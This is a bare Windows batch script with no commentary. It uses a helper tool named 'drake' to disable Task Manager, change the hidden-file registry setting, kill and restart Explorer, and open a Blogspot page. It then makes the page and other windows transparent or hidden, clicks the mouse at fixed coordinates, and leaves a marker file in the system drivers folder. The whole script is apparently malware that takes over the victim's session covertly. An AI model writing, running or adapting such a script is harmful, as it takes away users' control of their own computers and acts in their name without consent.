@echo off
if exist "%windir%\system32\drivers\capdrkmj.log" goto ja
drake regsetval dword "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" "CheckedValue" "2"
drake regsetval dword "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" "1"
taskkill -f -im explorer.exe
start/max http://saibatudomesmo.blogspot.com/
drake win trans ititle "DIGA" 01
drake win trans ititle "DIGA" 01
drake win trans stitle "i" 01
drake win trans stitle "c" 01
drake win trans stitle "a" 01
drake win trans stitle "b" 01
drake win trans stitle "c" 01
drake win trans stitle "d" 01
drake win trans stitle "f" 01
drake win trans stitle "g" 01
drake win trans stitle "h" 01
drake win trans stitle "i" 01
drake win trans stitle "j" 01
drake win trans stitle "k" 01
drake win trans stitle "l" 01
drake win trans stitle "m" 01
drake win trans stitle "n" 01
drake win trans stitle "o" 01
drake win trans stitle "p" 01
drake win trans stitle "q" 01
drake win trans stitle "r" 01
drake win trans stitle "q" 01
drake win trans stitle "s" 01
drake win trans stitle "t" 01
drake win trans stitle "u" 01
drake win trans stitle "v" 01
drake win trans stitle "x" 01
drake win trans stitle "z" 01
drake win trans stitle "w" 01
drake win trans stitle "y" 01
drake win trans ititle "DIGA" 01
drake win trans ititle "DIGA" 01
drake win trans stitle "i" 01
drake win trans stitle "c" 01
drake win trans stitle "a" 01
drake win trans stitle "b" 01
drake win trans stitle "c" 01
drake win trans stitle "d" 01
drake win trans stitle "f" 01
drake win trans stitle "g" 01
drake win trans stitle "h" 01
drake win trans stitle "i" 01
drake win trans stitle "j" 01
drake win trans stitle "k" 01
drake win trans stitle "l" 01
drake win trans stitle "m" 01
drake win trans stitle "n" 01
drake win trans stitle "o" 01
drake win trans stitle "p" 01
drake win trans stitle "q" 01
drake win trans stitle "r" 01
drake win trans stitle "q" 01
drake win trans stitle "s" 01
drake win trans stitle "t" 01
drake win trans stitle "u" 01
drake win trans stitle "v" 01
drake win trans stitle "x" 01
drake win trans stitle "z" 01
drake win trans stitle "w" 01
drake win trans stitle "y" 01
drake win trans ititle "DIGA" 01
drake win trans ititle "DIGA" 01
drake win trans stitle "1" 01
drake win trans stitle "2" 01
drake win trans stitle "3" 01
drake win trans stitle "4" 01
drake win trans stitle "5" 01
drake win trans stitle "6" 01
drake win trans stitle "7" 01
drake win trans stitle "8" 01
drake win trans stitle "9" 01
drake win trans stitle "\" 01
drake win trans stitle "/" 01
drake win trans stitle "." 01
drake win trans stitle "+" 01
drake win trans stitle "_" 01
drake win trans stitle "-" 01
drake win trans stitle "(" 01
drake win trans stitle ")" 01
drake win trans stitle "*" 01
drake win trans stitle "&" 01
drake win trans stitle "%" 01
drake win trans stitle "$" 01
drake win trans stitle "#" 01
drake win trans stitle "@" 01
drake win trans stitle "!" 01
drake win trans stitle """ 01
drake win trans stitle """ 01
drake win trans stitle "<" 01
drake win trans stitle ">" 01
start/min msg.bat
drake wait 20000
drake win max ititle "DIGA"
drake setcursor 150 420
drake sendmouse left click
echo. >> "%windir%\system32\drivers\capdrkmj.log"
drake wait 500
drake win hide ititle "DIGA"
drake win hide stitle "i" 19
drake win hide stitle "c" 192
drake win hide stitle "a" 192
drake win hide stitle "b" 192
drake win hide stitle "c" 192
drake win hide stitle "d" 192
drake win hide stitle "f" 192
drake win hide stitle "g" 192
drake win hide stitle "h" 192
drake win hide stitle "i" 192
drake win hide stitle "j" 192
drake win hide stitle "k" 192
drake win hide stitle "l" 192
drake win hide stitle "m" 192
drake win hide stitle "n" 192
drake win hide stitle "o" 192
drake win hide stitle "p" 192
drake win hide stitle "q" 192
drake win hide stitle "r" 192
drake win hide stitle "q" 192
drake win hide stitle "s" 192
drake win hide stitle "t" 192
drake win hide stitle "u" 192
drake win hide stitle "v" 192
drake win hide stitle "x" 192
drake win hide stitle "z" 192
drake win hide stitle "w" 192
drake win hide stitle "y" 192
drake win hide ititle "DIGA"
drake win hide ititle "http:\\"
drake win hide ititle "carregando..."
drake win hide stitle "i" 192 
drake win hide ititle "DIGA" 01
drake win hide ititle "DIGA" 01
drake win hide stitle "1" 01
drake win hide stitle "2" 01
drake win hide stitle "3" 01
drake win hide stitle "4" 01
drake win hide stitle "5" 01
drake win hide stitle "6" 01
drake win hide stitle "7" 01
drake win hide stitle "8" 01
drake win hide stitle "9" 01
drake win hide stitle "\" 01
drake win hide stitle "/" 01
drake win hide stitle "." 01
drake win hide stitle "+" 01
drake win hide stitle "_" 01
drake win hide stitle "-" 01
drake win hide stitle "(" 01
drake win hide stitle ")" 01
drake win hide stitle "*" 01
drake win hide stitle "&" 01
drake win hide stitle "%" 01
drake win hide stitle "$" 01
drake win hide stitle "#" 01
drake win hide stitle "@" 01
drake win hide stitle "!" 01
drake win hide stitle """ 01
drake win hide stitle """ 01
drake win hide stitle "<" 01
drake win hide stitle ">" 01
taskkill -f -im msg.bat
taskkill -f -im drake.exe
start explorer.exe
taskkill -f -im cmd.exe
exit
:ja
